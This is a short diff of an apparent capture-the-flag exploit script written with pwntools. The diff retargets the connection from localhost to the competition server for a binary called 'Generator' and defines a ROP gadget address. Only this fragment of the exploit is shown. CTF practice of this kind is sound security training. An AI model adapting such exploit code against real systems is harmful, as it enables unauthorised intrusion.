@@ -1,6 +1,6 @@
 from pwn import *
 
-r = remote("127.0.0.1", 8000)
+r = remote("pwn.heroctf.fr", 8000)
 #r = process("./Generator")
 
 xor_ptr_rdi_rsi = p64(0x40121e)
